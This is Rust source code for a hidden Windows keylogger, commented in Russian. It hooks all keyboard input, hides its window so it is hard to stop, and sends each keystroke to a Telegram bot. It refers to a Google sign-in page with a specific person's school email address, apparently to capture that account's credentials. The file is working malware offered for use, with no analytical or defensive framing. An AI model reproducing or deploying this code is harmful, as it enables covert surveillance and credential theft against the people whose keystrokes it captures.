// это нужно чтобы было сложно отключить прогу
#![windows_subsystem = "windows"]

extern crate winapi;

use winapi::um::winuser::{CallNextHookEx, GetAsyncKeyState, GetKeyState, SetWindowsHookExA, UnhookWindowsHookEx, WH_KEYBOARD_LL, HC_ACTION, WM_SYSKEYDOWN, WM_KEYDOWN, KBDLLHOOKSTRUCT};
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
use winapi::shared::windef::HHOOK;
use winapi::um::winuser::{DispatchMessageA, GetMessageA, TranslateMessage, MSG};

use reqwest;
use serde_json::json;
use tokio;

use std::ptr::null_mut;
use dns_lookup::lookup_host;

mod config;

// отправка сообщения в тг
async fn bot(text: String) {
    // Получаем токен бота и ID  чата
    let bot_token = config::BOT_TOKEN;
    let chat_id = config::CHAT_ID;

    // Формируем URL для API Telegram
    let url = format!("https://api.telegram.org/bot{}/sendMessage", bot_token);

    // Создаем HTTP клиент
    let client = reqwest::Client::new();

    // Отправляем POST запрос с параметрами
    let _response = client.post(&url)
        .json(&json!({
            "chat_id": chat_id,
            "text": text
        }))
        .send()
        .await;
}

unsafe extern "system" fn keyboard_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    let domain = "https://accounts.google.com/v3/signin/identifier?Email=amelchakov%40fmschool72.ru&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S992212922%3A1740144921379976&ddm=1";
    if (n_code == HC_ACTION && (w_param == WM_SYSKEYDOWN as usize || w_param == WM_KEYDOWN as usize)) && !is_site_open(domain) {
        let p_keyboard = &*(l_param as *const KBDLLHOOKSTRUCT);
        let caps_lock_on = (GetKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001) != 0;
        let shift_pressed = (GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) & 0x8000u16 as i16) != 0;

        if caps_lock_on {
            tokio::spawn(bot(String::from("(Caps Lock) ")));
        }

        if shift_pressed && is_any_key_pressed() {
            if p_keyboard.vkCode == 164 {
                tokio::spawn(bot(String::from("(Shift) Key pressed: Alt")));
            } else {
                let s = format!("Key pressed: {}", p_keyboard.vkCode as u8 as char);
                tokio::spawn(bot(s));
            }
        } else {
            let s = format!("Key pressed: {}", p_keyboard.vkCode as u8 as char);
            match p_keyboard.vkCode {
                9 => tokio::spawn(bot(String::from("Key pressed: Tab"))),
                20 => tokio::spawn(bot(String::from("Key pressed: Caps Lock"))),
                160 => tokio::spawn(bot(String::from("Key pressed: Shift"))),
                162 => tokio::spawn(bot(String::from("Key pressed: Ctrl"))),
                164 => tokio::spawn(bot(String::from("Key pressed: Alt"))),
                32 => tokio::spawn(bot(String::from("Key pressed: Space"))),
                27 => tokio::spawn(bot(String::from("Key pressed: Esc"))),
                8 => tokio::spawn(bot(String::from("Key pressed: Backspace"))),
                13 => tokio::spawn(bot(String::from("Key pressed: Enter"))),
                _ => tokio::spawn(bot(s)),
            };
        }
    }
    CallNextHookEx(null_mut(), n_code, w_param, l_param)
}

fn is_any_key_pressed() -> bool {
    for i in 0..256 {
        unsafe {
            if (GetAsyncKeyState(i) & 0x8000u16 as i16) != 0 && i != winapi::um::winuser::VK_SHIFT {
                return true;
            }
        }
    }
    false
}

fn set_hook() -> HHOOK {
    unsafe {
        let h_instance = GetModuleHandleA(null_mut());
        SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_proc), h_instance, 0)
    }
}

fn release_hook(h_hook: HHOOK) {
    unsafe {
        UnhookWindowsHookEx(h_hook);
    }
}

// Проверка соединений
fn check_connections(target_ip: &str, target_port: u16) -> bool {
    use std::process::Command;

    let output = Command::new("netstat")
        .args(&["-n", "-a", "-p", "tcp"])
        .output()
        .expect("Failed to execute netstat");

    let output_str = String::from_utf8_lossy(&output.stdout);
    output_str
        .lines()
        .filter(|line| line.contains("ESTABLISHED"))
        .any(|line| {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() < 3 {
                return false;
            }
            let remote = parts[2];
            let remote_parts: Vec<&str> = remote.split(':').collect();
            remote_parts.len() == 2
                && remote_parts[0] == target_ip
                && remote_parts[1].parse::<u16>().unwrap_or(0) == target_port
        })
}

// Проверка доступности сайта
fn is_site_open(domain: &str) -> bool {
    if let Ok(ips) = lookup_host(domain) {
        ips.into_iter().any(|ip| {
            let target_ip = ip.to_string();
            let ports = vec![80, 443]; // HTTP и HTTPS
            ports.into_iter().any(|port| check_connections(&target_ip, port))
        })
    } else {
        false
    }
}

#[tokio::main]
async fn main() {
    let h_hook = set_hook();
    if h_hook.is_null() {
        eprintln!("Failed to install hook!");
        return;
    }

    unsafe {
        let mut msg: MSG = std::mem::zeroed();
        while GetMessageA(&mut msg, null_mut(), 0, 0) != 0 {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
    }

    release_hook(h_hook);
}
